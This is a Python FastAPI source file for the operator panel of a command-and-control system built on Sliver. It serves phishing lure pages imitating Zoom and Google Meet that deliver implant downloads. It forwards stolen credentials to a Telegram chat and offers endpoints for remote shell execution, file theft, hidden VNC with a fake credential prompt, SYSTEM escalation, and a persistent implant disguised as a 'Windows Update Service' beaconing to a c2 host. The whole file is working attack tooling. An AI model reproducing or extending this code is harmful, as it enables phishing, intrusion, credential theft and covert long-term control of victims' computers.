"""FastAPI application factory, routes and WebSocket endpoints."""

from __future__ import annotations

import asyncio
import base64
import logging
import mimetypes
import ntpath
import secrets
import time
from contextlib import asynccontextmanager, suppress
from pathlib import Path

from fastapi import FastAPI, Form, HTTPException, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import (
    FileResponse,
    HTMLResponse,
    JSONResponse,
    PlainTextResponse,
    RedirectResponse,
    Response,
)
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.concurrency import run_in_threadpool

from . import health, landing
from .alerts import Alerts
from .auth import Auth
from .build import BuildPipeline, load_build_request
from .config import Settings
from .db import Database
from .rd import RDBroker
from .sliver import BridgeError, SliverBridge
from .tg import Telegram, escape
from .views import BridgeViews

log = logging.getLogger("fleet.panel")

CSRF_COOKIE = "fleet_csrf"


def _client_ip(request: Request) -> str:
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.client.host if request.client else ""


def create_app(settings: Settings | None = None) -> FastAPI:
    config = settings or Settings.load()
    database = Database(config.db_path)
    database.migrate()
    auth = Auth(config, database)

    def on_creds(session_id: str, data: dict) -> None:
        username = str(data.get("user") or data.get("username") or "")
        secret = str(data.get("pass") or data.get("password") or "")
        source = str(data.get("source") or "hvnc")
        if not (username or secret):
            return
        database.add_cred(session_id, username, secret, source)
        database.audit("system", "creds", "ok", target=session_id, detail=source)
        telegram.send(
            f"\U0001f511 <b>CREDENTIALS</b>\nuser: {escape(username)}\n"
            f"pass: <code>{escape(secret)}</code>\n<code>{escape(session_id)}</code>"
        )

    broker = RDBroker(config, on_creds=on_creds)
    telegram = Telegram(config.tg_bot_token, config.tg_chat_id)
    alerts = Alerts(config, telegram, app_bridge := SliverBridge(config), database)

    @asynccontextmanager
    async def lifespan(_app: FastAPI):
        database.audit("system", "startup", "ok")
        with suppress(OSError):
            await broker.start()
        telegram.start()
        alerts.start()
        alerts.panel_start()
        yield
        await broker.stop()

    app = FastAPI(title="fleet panel", docs_url=None, redoc_url=None, lifespan=lifespan)
    app.state.settings = config
    app.state.db = database
    app.state.auth = auth
    app.state.bridge = app_bridge
    app.state.views = BridgeViews(config, database, app_bridge)
    app.state.pipeline = BuildPipeline(config, database, app_bridge)
    app.state.broker = broker
    app.state.tg = telegram
    app.state.alerts = alerts

    if config.static_dir.is_dir():
        app.mount("/static", StaticFiles(directory=str(config.static_dir)), name="static")

    templates = Jinja2Templates(directory=str(config.templates_dir))

    def render(request: Request, name: str, **context: object) -> HTMLResponse:
        context.setdefault("settings", config)
        context.setdefault("session", getattr(request.state, "session", None))
        context.setdefault("health", health.snapshot(config))
        context.setdefault("now", time.time())
        return templates.TemplateResponse(request, name, context)

    def csrf_token(request: Request) -> str:
        session = getattr(request.state, "session", None)
        if session is not None:
            return str(session["csrf"])
        cookie = request.cookies.get(CSRF_COOKIE, "")
        token = auth.unsign(cookie)
        if token:
            return token
        return ""

    def require(request: Request):
        return getattr(request.state, "session", None)

    def bridge_failure(exc: Exception) -> HTTPException:
        text = str(exc)
        stale = (
            "not found",
            "not connected",
            "no session",
            "invalid session",
            "record not found",
            "session is closed",
            "dead",
        )
        if any(key in text.lower() for key in stale):
            return HTTPException(status_code=404, detail="session not connected")
        return HTTPException(status_code=502, detail=text)

    @app.middleware("http")
    async def session_middleware(request: Request, call_next):
        request.state.session = None
        raw = request.cookies.get(config.session_cookie)
        if raw:
            session_id = auth.unsign(raw)
            if session_id:
                row = await run_in_threadpool(auth.get_session, session_id)
                if row is not None:
                    request.state.session = row
                    await run_in_threadpool(auth.touch_session, session_id)
        return await call_next(request)

    # -- health --------------------------------------------------------------
    @app.get("/healthz")
    async def healthz() -> PlainTextResponse:
        return PlainTextResponse("ok\n")

    @app.get("/healthz.json")
    async def healthz_json() -> JSONResponse:
        probes = await run_in_threadpool(health.as_dict, config)
        return JSONResponse(probes)

    # -- auth ----------------------------------------------------------------
    @app.get("/login", response_class=HTMLResponse)
    async def login_form(request: Request, error: str = "") -> HTMLResponse:
        if require(request):
            return RedirectResponse("/", status_code=303)
        token = secrets.token_urlsafe(24)
        response = render(request, "login.html", error=error, csrf=token)
        response.set_cookie(
            CSRF_COOKIE,
            auth.serializer.dumps(token),
            httponly=True,
            samesite="strict",
            secure=config.cookie_secure,
            max_age=900,
        )
        return response

    @app.post("/login")
    async def login_submit(
        request: Request,
        username: str = Form(...),
        password: str = Form(...),
        totp: str = Form(""),
        csrf: str = Form(""),
    ):
        ip = _client_ip(request)
        provided = auth.unsign(request.cookies.get(CSRF_COOKIE, ""))
        if not provided or not secrets.compare_digest(provided, csrf):
            database.audit(username or "?", "login", "fail", detail="csrf")
            return RedirectResponse("/login?error=csrf", status_code=303)

        key = f"user:{username.lower()}"
        remaining = auth.lockout_remaining(key)
        if remaining > 0:
            database.audit(username, "login", "locked", detail=f"{int(remaining)}s")
            return RedirectResponse(f"/login?error=locked+{int(remaining)}s", status_code=303)

        ok = await run_in_threadpool(auth.verify_password, password)
        ok = ok and await run_in_threadpool(auth.verify_totp, totp)
        if not ok or username != config.panel_user:
            await run_in_threadpool(auth.register_failure, key)
            database.audit(username, "login", "fail", target=ip, detail="bad credentials")
            burst = await run_in_threadpool(auth.recent_failures)
            if burst == 3:
                app.state.alerts.login_burst(burst)
            return RedirectResponse("/login?error=invalid", status_code=303)

        await run_in_threadpool(auth.clear_failures, key)
        session_id, _csrf = await run_in_threadpool(
            auth.create_session, username, ip, request.headers.get("user-agent", "")
        )
        database.audit(username, "login", "ok", target=ip, detail="rotated session")
        response = RedirectResponse("/", status_code=303)
        response.set_cookie(
            config.session_cookie,
            auth.sign(session_id),
            httponly=True,
            samesite="strict",
            secure=config.cookie_secure,
            max_age=config.session_ttl,
        )
        response.delete_cookie(CSRF_COOKIE)
        return response

    @app.post("/logout")
    async def logout(request: Request, csrf: str = Form("")):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        if auth.verify_csrf(str(session["csrf"]), csrf):
            await run_in_threadpool(auth.invalidate, str(session["id"]))
            database.audit(str(session["actor"]), "logout", "ok")
        response = RedirectResponse("/login", status_code=303)
        response.delete_cookie(config.session_cookie)
        return response

    def host_prefix(request: Request) -> str:
        return request.headers.get("host", "").split(":")[0].split(".")[0]

    # -- landing (lure hosts) -----------------------------------------------
    def lure_index(profile: str) -> HTMLResponse:
        index = config.lure_dir_for(profile) / "index.html"
        if not index.is_file():
            return HTMLResponse(landing.page(config, {}, ""))
        html = index.read_text(encoding="utf-8", errors="ignore")
        inject = '<script src="/__lure.js"></script>'
        if "</body>" in html:
            html = html.replace("</body>", inject + "</body>", 1)
        else:
            html += inject
        return HTMLResponse(html)

    @app.get("/", response_class=HTMLResponse)
    async def dashboard(request: Request):
        prefix = host_prefix(request)
        if prefix in config.lure_hosts or prefix in config.lure_meet_hosts:
            return lure_index(config.profile_for_host(prefix))
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        implants = await app.state.views.implants()
        return render(
            request,
            "dashboard.html",
            csrf=csrf_token(request),
            implants=implants,
        )

    @app.get("/__lure.js")
    async def lure_js() -> PlainTextResponse:
        return PlainTextResponse(
            landing.LURE_JS,
            media_type="application/javascript",
            headers={"Cache-Control": "no-store"},
        )

    @app.get("/__lure/target")
    async def lure_target(request: Request, os: str = "all", ua: str = ""):
        prefix = host_prefix(request)
        profile = config.profile_for_host(prefix)
        pool = config.lure_meet_hosts if profile == "meet" else config.lure_hosts
        family = landing.sniff(ua) if ua else os
        family = landing.family_for_os(family if family != "all" else os)
        recent = await run_in_threadpool(app.state.pipeline.recent, 300)

        def art_profile(artifact: dict) -> str:
            stored = str(artifact.get("profile") or "")
            if stored:
                return stored
            name = str(artifact.get("name", "")).lower()
            return "meet" if ("meet" in name or "google" in name) else "zoom"

        matching = [a for a in recent if art_profile(a) == profile]
        picked = landing.newest(matching)
        artifact = picked.get(family) or (next(iter(picked.values())) if picked else None)
        if artifact is None:
            return JSONResponse({"url": "", "family": family, "profile": profile})
        host = request.headers.get("host", config.public_host)
        zone = host.split(":", 1)[0].split(".", 1)[1] if "." in host else host
        download_host = f"{secrets.choice(pool)}.{zone}"
        url = f"https://{download_host}/e/{artifact['slug']}"
        return JSONResponse(
            {"url": url, "family": family, "profile": profile, "slug": artifact["slug"]},
            headers={"Cache-Control": "no-store"},
        )

    @app.get("/e/{slug}")
    async def landing_slug(slug: str):
        with database.connect() as conn:
            row = conn.execute(
                "SELECT slug, artifact_id, first_hit FROM slugs WHERE slug = ?", (slug,)
            ).fetchone()
            if row is None:
                raise HTTPException(status_code=404, detail="unknown slug")
            now = time.time()
            if float(row["first_hit"]) == 0:
                conn.execute(
                    "UPDATE slugs SET first_hit = ?, hits = hits + 1 WHERE slug = ?", (now, slug)
                )
            else:
                conn.execute("UPDATE slugs SET hits = hits + 1 WHERE slug = ?", (slug,))
            artifact = conn.execute(
                "SELECT name FROM artifacts WHERE id = ?", (row["artifact_id"],)
            ).fetchone()
        if artifact is None:
            raise HTTPException(status_code=404, detail="artifact gone")
        return RedirectResponse(f"/dl/{artifact['name']}", status_code=302)

    @app.get("/audit", response_class=HTMLResponse)
    async def audit_page(request: Request):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        rows = await run_in_threadpool(database.recent_audit, 300)
        return render(request, "audit.html", csrf=csrf_token(request), rows=rows)

    @app.get("/audit.csv")
    async def audit_csv(request: Request):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        rows = await run_in_threadpool(database.audit_csv)
        lines = ["id,ts,actor,action,target,result,detail"]
        for row in rows:
            fields = [
                str(row["id"]),
                f"{row['ts']:.3f}",
                str(row["actor"]),
                str(row["action"]),
                str(row["target"]),
                str(row["result"]),
                str(row["detail"]).replace(",", ";").replace("\n", " "),
            ]
            lines.append(",".join(fields))
        headers = {"Content-Disposition": "attachment; filename=audit.csv"}
        return PlainTextResponse("\n".join(lines) + "\n", headers=headers, media_type="text/csv")

    # -- build ---------------------------------------------------------------
    @app.get("/build", response_class=HTMLResponse)
    async def build_page(request: Request):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        artifacts = await run_in_threadpool(app.state.pipeline.recent)
        return render(
            request,
            "build.html",
            csrf=csrf_token(request),
            artifacts=artifacts,
            error="",
            defaults=config,
        )

    @app.post("/build", response_class=HTMLResponse)
    async def build_submit(request: Request):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        form = await request.form()
        if not auth.verify_csrf(str(session["csrf"]), str(form.get("csrf", ""))):
            return RedirectResponse("/build?error=csrf", status_code=303)
        build_request = load_build_request({key: str(value) for key, value in form.items()}, config)
        try:
            built = await run_in_threadpool(app.state.pipeline.build, build_request)
            database.audit(str(session["actor"]), "build", "ok", detail=f"{len(built)} artifacts")
            error = ""
        except Exception as exc:  # surfaced to the operator, never swallowed
            database.audit(str(session["actor"]), "build", "fail", detail=str(exc)[:200])
            built = []
            error = f"{type(exc).__name__}: {exc}"
        artifacts = await run_in_threadpool(app.state.pipeline.recent)
        return render(
            request,
            "build.html",
            csrf=csrf_token(request),
            artifacts=artifacts,
            error=error,
            defaults=config,
        )

    @app.get("/dl/decoy.pdf")
    async def decoy() -> PlainTextResponse:
        from .build import minimal_pdf

        return PlainTextResponse(
            minimal_pdf(config.document_name),
            media_type="application/pdf",
            headers={"Cache-Control": "no-store"},
        )

    @app.get("/dl/{name}")
    async def download_artifact(name: str):
        path = config.artifacts_dir / name
        if not path.is_file():
            raise HTTPException(status_code=404, detail=f"no artifact {name}")
        media = mimetypes.guess_type(name)[0] or "application/octet-stream"
        return FileResponse(
            path,
            filename=name,
            media_type=media,
            headers={"Cache-Control": "no-store"},
        )

    # -- session drawer ------------------------------------------------------
    def bridge_ws_url(path: str) -> str:
        base = config.bridge_url.replace("https://", "wss://").replace("http://", "ws://")
        return base + path

    async def ws_session(websocket: WebSocket):
        raw = websocket.cookies.get(config.session_cookie)
        if not raw:
            return None
        session_id = auth.unsign(raw)
        if not session_id:
            return None
        return await run_in_threadpool(auth.get_session, session_id)

    @app.get("/s/{session_id}", response_class=HTMLResponse)
    async def session_page(request: Request, session_id: str):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        implants, _err = await app.state.views.implants()
        host = next((s.get("host", "") for s in implants if s.get("id") == session_id), "")
        return render(
            request,
            "session.html",
            csrf=csrf_token(request),
            session_id=session_id,
            session_host=host,
            rd_host=config.public_host,
            rd_port=config.rd_port,
            has_token=True,
        )

    @app.get("/api/{session_id}/token")
    async def api_token(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        token = await run_in_threadpool(broker.mint, session_id)
        return JSONResponse({"token": token, "session_id": session_id})

    @app.get("/api/sessions")
    async def api_sessions(request: Request):
        if require(request) is None:
            raise HTTPException(status_code=401)
        implants, err = await app.state.views.implants()
        return JSONResponse({"sessions": implants, "error": err})

    @app.get("/api/{session_id}/info")
    async def api_info(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        return JSONResponse(await app.state.views.info(session_id))

    @app.post("/api/{session_id}/exec")
    async def api_exec(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        path = body.get("path") or "sh"
        args = body.get("args") or []
        try:
            result = await run_in_threadpool(app.state.bridge.exec, session_id, path, args)
        except BridgeError as exc:
            raise bridge_failure(exc) from exc
        return JSONResponse(result)

    @app.post("/api/{session_id}/ls")
    async def api_ls(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        try:
            return JSONResponse(
                await run_in_threadpool(app.state.bridge.ls, session_id, body.get("path", "."))
            )
        except BridgeError as exc:
            raise bridge_failure(exc) from exc

    @app.post("/api/{session_id}/ps")
    async def api_ps(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        try:
            return JSONResponse(await run_in_threadpool(app.state.bridge.ps, session_id))
        except BridgeError as exc:
            raise bridge_failure(exc) from exc

    @app.post("/api/{session_id}/kill")
    async def api_kill(request: Request, session_id: str):
        session = require(request)
        if session is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        try:
            result = await run_in_threadpool(app.state.bridge.kill, session_id, int(body["pid"]))
        except BridgeError as exc:
            raise bridge_failure(exc) from exc
        database.audit(
            str(session["actor"]), "kill", "ok", target=session_id, detail=str(body["pid"])
        )
        return JSONResponse(result)

    @app.post("/api/{session_id}/tags")
    async def api_tags(request: Request, session_id: str):
        session = require(request)
        if session is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        tags = [t for t in (body.get("tags") or "").split(",") if t.strip()]
        await run_in_threadpool(app.state.views.set_tags, session_id, tags)
        database.audit(str(session["actor"]), "tag", "ok", target=session_id, detail=",".join(tags))
        return JSONResponse({"ok": True, "tags": tags})

    @app.post("/api/{session_id}/upload")
    async def api_upload(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        form = await request.form()
        upload = form.get("file")
        remote = str(form.get("path") or ".")
        if upload is None:
            raise HTTPException(status_code=400, detail="no file")
        data = await upload.read()
        try:
            return JSONResponse(
                await run_in_threadpool(
                    app.state.bridge.upload, session_id, remote, upload.filename, data
                )
            )
        except BridgeError as exc:
            raise bridge_failure(exc) from exc

    @app.get("/api/{session_id}/download")
    async def api_download(request: Request, session_id: str, path: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        try:
            data = await run_in_threadpool(app.state.bridge.download, session_id, path)
        except BridgeError as exc:
            raise bridge_failure(exc) from exc
        filename = path.replace("\\", "/").rsplit("/", 1)[-1]
        return Response(
            content=data,
            media_type="application/octet-stream",
            headers={
                "Content-Disposition": f'attachment; filename="{filename}"',
                "Cache-Control": "no-store",
            },
        )

    @app.post("/api/{session_id}/desktop")
    async def api_desktop(request: Request, session_id: str):
        """Upload and launch the rd-win helper on the target so the desktop tab
        streams. The helper connects to the public rd broker (PANEL_RD_ENDPOINT)."""
        session = require(request)
        if session is None:
            raise HTTPException(status_code=401)
        try:
            body = await request.json()
        except ValueError:
            body = {}
        rd = Path(config.panel_bin_dir) / "rd-win.exe"
        if not rd.is_file():
            raise HTTPException(status_code=400, detail="rd-win.exe not built on this host")
        token = await run_in_threadpool(broker.mint, session_id)
        remote = str(body.get("dir") or "C:\\\\ProgramData")
        remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
        # unique name per launch: avoids "file in use" when a helper is already
        # running and the operator reconnects.
        rd_name = f"rdw-{secrets.token_hex(3)}.exe"
        try:
            await run_in_threadpool(
                app.state.bridge.upload, session_id, remote, rd_name, rd.read_bytes()
            )
        except BridgeError as exc:
            raise bridge_failure(exc) from exc
        host, _, port = config.rd_endpoint.rpartition(":")
        host = host or "127.0.0.1"
        port = port or "8443"
        exe = ntpath.join(remote, rd_name)
        args = [
            "--host", host, "--port", port,
            "--session", session_id, "--token", token,
        ]
        try:
            result = await run_in_threadpool(
                app.state.bridge.exec, session_id, exe, args, False, True
            )
        except BridgeError as exc:
            raise bridge_failure(exc) from exc
        database.audit(str(session["actor"]), "desktop", "ok", target=session_id)
        return JSONResponse({"ok": True, "rd_endpoint": config.rd_endpoint, "detail": result})

    @app.post("/api/{session_id}/getsystem")
    async def api_getsystem(request: Request, session_id: str):
        session = require(request)
        if session is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        try:
            result = await run_in_threadpool(
                app.state.bridge.getsystem,
                session_id,
                body.get("hosting_process", ""),
                body.get("name", ""),
            )
        except BridgeError as exc:
            raise bridge_failure(exc) from exc
        database.audit(str(session["actor"]), "getsystem", "ok", target=session_id)
        return JSONResponse(result)

    @app.post("/api/{session_id}/service")
    async def api_service(request: Request, session_id: str):
        """Install a Windows service implant: auto-start at boot, SYSTEM, no user
        logged in required (truly unattended). Requires an elevated session."""
        session = require(request)
        if session is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        svc = str(body.get("name") or "WinUpdateSvc")
        arch = str(body.get("arch") or "amd64")
        zone = config.cf_zone_name
        if not zone and "." in config.public_host:
            zone = config.public_host.split(".", 1)[1]
        c2 = f"c2.{zone or '127.0.0.1'}:8888"
        payload = {
            "os": "windows",
            "arch": arch,
            "format": "service",
            "transport": "mtls",
            "c2_url": c2,
            "is_beacon": True,
            "interval": 60,
            "jitter": 35,
            "evasion": True,
            "name": f"{svc}-{secrets.token_hex(3)}",
        }
        try:
            gen = await run_in_threadpool(app.state.bridge.generate, payload)
            data = base64.b64decode(gen["data_b64"])
            remote = str(body.get("dir") or "C:\\ProgramData")
            remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
            await run_in_threadpool(app.state.bridge.upload, session_id, remote, f"{svc}.exe", data)
            exe = ntpath.join(remote, f"{svc}.exe")
            command = (
                f'sc create {svc} binPath= "\\"{exe}\\"" start= auto && '
                f'sc description {svc} "Windows Update Service" && sc start {svc}'
            )
            result = await run_in_threadpool(
                app.state.bridge.exec, session_id, "cmd.exe", ["/c", command]
            )
        except BridgeError as exc:
            raise bridge_failure(exc) from exc
        database.audit(str(session["actor"]), "service", "ok", target=session_id, detail=svc)
        return JSONResponse({"ok": True, "service": svc, "exe": exe, "detail": result})

    @app.post("/api/{session_id}/persist")
    async def api_persist(request: Request, session_id: str):
        session = require(request)
        if session is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        try:
            result = await run_in_threadpool(
                app.state.bridge.persist,
                session_id,
                body.get("file_path", ""),
                body.get("name", "WinUpdateSvc"),
            )
        except BridgeError as exc:
            raise bridge_failure(exc) from exc
        database.audit(
            str(session["actor"]),
            "persist",
            "ok",
            target=session_id,
            detail=str(body.get("name", "WinUpdateSvc")),
        )
        return JSONResponse(result)

    @app.get("/api/{session_id}/creds")
    async def api_creds(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        rows = await run_in_threadpool(database.creds_for, session_id)
        return JSONResponse({"creds": [dict(row) for row in rows]})

    @app.post("/api/{session_id}/hvnc")
    async def api_hvnc(request: Request, session_id: str):
        session = require(request)
        if session is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        hvnc_bin = Path(config.panel_bin_dir) / "hvnc.exe"
        prompt_bin = Path(config.panel_bin_dir) / "credprompt.exe"
        if not hvnc_bin.is_file():
            raise HTTPException(status_code=400, detail="hvnc.exe not built on this host")
        token = await run_in_threadpool(broker.mint, session_id)
        remote = body.get("dir") or "C:\\\\ProgramData"
        remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
        try:
            await run_in_threadpool(
                app.state.bridge.upload, session_id, remote, "hvnc.exe", hvnc_bin.read_bytes()
            )
            if prompt_bin.is_file():
                await run_in_threadpool(
                    app.state.bridge.upload,
                    session_id,
                    remote,
                    "credprompt.exe",
                    prompt_bin.read_bytes(),
                )
        except BridgeError as exc:
            raise bridge_failure(exc) from exc

        host, _, port = config.rd_endpoint.rpartition(":")
        host = host or "127.0.0.1"
        port = port or "8443"
        spawn = body.get("spawn") or "explorer.exe"
        desktop = body.get("desktop") or "FleetHVNC"
        hvnc_path = ntpath.join(remote, "hvnc.exe")
        creds_path = ntpath.join(remote, "fleet-creds.json")
        prompt_path = ntpath.join(remote, "credprompt.exe")
        args = [
            "--host", host, "--port", port, "--session", session_id,
            "--token", token, "--desktop", desktop, "--spawn", spawn,
            "--creds", creds_path, "--prompt", prompt_path,
        ]
        try:
            result = await run_in_threadpool(
                app.state.bridge.exec, session_id, hvnc_path, args, False, True
            )
        except BridgeError as exc:
            raise bridge_failure(exc) from exc
        database.audit(str(session["actor"]), "hvnc", "ok", target=session_id, detail=desktop)
        return JSONResponse({"ok": True, "detail": result, "rd_endpoint": config.rd_endpoint})

    @app.websocket("/shell/{session_id}")
    async def ws_shell(websocket: WebSocket, session_id: str):
        if await ws_session(websocket) is None:
            await websocket.close(code=4001)
            return
        await websocket.accept()
        from websockets.asyncio.client import connect

        try:
            async with connect(bridge_ws_url(f"/sliver/session/{session_id}/shell")) as bridge_conn:

                async def upstream():
                    while True:
                        try:
                            message = await websocket.receive()
                        except WebSocketDisconnect:
                            return
                        if message["type"] == "websocket.disconnect":
                            return
                        if message.get("text") is not None:
                            await bridge_conn.send(message["text"])
                        elif message.get("bytes") is not None:
                            await bridge_conn.send(message["bytes"])

                async def downstream():
                    async for message in bridge_conn:
                        if isinstance(message, bytes):
                            await websocket.send_bytes(message)
                        else:
                            await websocket.send_text(message)

                done, pending = await asyncio.wait(
                    [asyncio.create_task(upstream()), asyncio.create_task(downstream())],
                    return_when=asyncio.FIRST_COMPLETED,
                )
                for task in pending:
                    task.cancel()
                for task in done:
                    with suppress(Exception):
                        task.result()
        except (OSError, WebSocketDisconnect):
            with suppress(Exception):
                await websocket.close()

    @app.websocket("/rd/{session_id}")
    async def ws_rd(websocket: WebSocket, session_id: str):
        if await ws_session(websocket) is None:
            await websocket.close(code=4001)
            return
        await websocket.accept()
        queue = broker.subscribe(session_id)

        async def pump():
            while True:
                message = await queue.get()
                if isinstance(message, bytes):
                    await websocket.send_bytes(message)
                else:
                    await websocket.send_text(message)

        pump_task = asyncio.create_task(pump())
        try:
            while True:
                message = await websocket.receive()
                if message["type"] == "websocket.disconnect":
                    break
                text = message.get("text")
                if text:
                    await broker.send_input(session_id, text)
        except WebSocketDisconnect:
            pass
        finally:
            pump_task.cancel()
            broker.unsubscribe(session_id, queue)

    # catch-all for mirrored lure assets (/ _next/*, /sites/*, /favicon.ico, ...)
    @app.get("/{path:path}")
    async def lure_asset(request: Request, path: str):
        # dl.<zone>/<artifact> (EXTRA D4: no /dl prefix on the dl host)
        if host_prefix(request) == "dl":
            artifact = config.artifacts_dir / path
            if artifact.is_file():
                media = mimetypes.guess_type(path)[0] or "application/octet-stream"
                return FileResponse(
                    artifact,
                    filename=path,
                    media_type=media,
                    headers={"Cache-Control": "no-store"},
                )
        for base in (config.lure_dir, config.lure_meet_dir, config.lure_dir.parent):
            candidate = base / path
            if candidate.is_file():
                return FileResponse(candidate)
        raise HTTPException(status_code=404, detail=f"no {path}")

    return app


app = create_app()
